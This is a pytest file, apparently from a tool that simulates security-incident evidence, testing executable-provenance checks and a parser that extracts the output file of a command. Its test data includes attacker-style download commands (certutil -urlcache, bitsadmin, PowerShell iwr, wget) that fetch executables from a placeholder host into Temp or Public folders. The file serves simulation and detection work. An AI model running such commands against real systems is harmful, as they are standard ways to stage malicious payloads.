# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Which storyline images already exist, and which commands write a file."""

import pytest

from evidenceforge.generation.activity.executable_provenance import executable_preexists
from evidenceforge.generation.engine.storyline import StorylineMixin


@pytest.mark.parametrize(
    ("image", "os_category", "expected"),
    [
        ("/usr/bin/curl", "linux", True),
        ("/tmp/cache-sync", "linux", False),
        ("/opt/app/bin/worker", "linux", False),
        ("curl", "linux", True),
        (r"C:\Windows\System32\cmd.exe", "windows", True),
        (r"C:\Windows\explorer.exe", "windows", True),
        (r"C:\Windows\Temp\payload.exe", "windows", False),
        (r"C:\Users\alex\AppData\Local\Temp\x.exe", "windows", False),
        ("/usr/bin/curl", "macos", True),
        ("/Applications/Safari.app/Contents/MacOS/Safari", "macos", True),
        ("/Users/alex/Downloads/implant", "macos", False),
    ],
)
def test_executable_preexists_recognizes_installed_images(
    image: str, os_category: str, expected: bool
) -> None:
    assert executable_preexists(image, os_category, "alex") is expected


@pytest.mark.parametrize(
    ("command", "os_category", "expected"),
    [
        ("curl.exe -fsS -o C:\\Users\\a\\x.exe https://h/x", "windows", "C:\\Users\\a\\x.exe"),
        (
            "certutil.exe -urlcache -split -f http://h/p.exe C:\\Users\\Public\\p.exe",
            "windows",
            "C:\\Users\\Public\\p.exe",
        ),
        (
            "bitsadmin /transfer job /priority high http://h/p.exe C:\\Temp\\p.exe",
            "windows",
            "C:\\Temp\\p.exe",
        ),
        (
            "cmd.exe /c copy \\\\fs\\share\\a.exe C:\\Users\\Public\\a.exe",
            "windows",
            "C:\\Users\\Public\\a.exe",
        ),
        (
            "powershell -c Copy-Item x.exe -Destination C:\\T\\y.exe",
            "windows",
            "C:\\T\\y.exe",
        ),
        ("powershell -c iwr https://h/x -OutFile C:\\T\\x.exe", "windows", "C:\\T\\x.exe"),
        ("cp /tmp/a /usr/local/bin/", "linux", "/usr/local/bin/a"),
        ("wget -O /tmp/x http://h", "linux", "/tmp/x"),
        ("cat x > /tmp/out.txt 2>&1", "linux", "/tmp/out.txt"),
        ("ls 2>&1", "linux", None),
        ("find / -name x 2>/dev/null", "linux", None),
        ("ps aux", "linux", None),
    ],
)
def test_extract_output_file_names_the_file_a_command_writes(
    command: str, os_category: str, expected: str | None
) -> None:
    assert StorylineMixin._extract_output_file(command, os_category) == expected
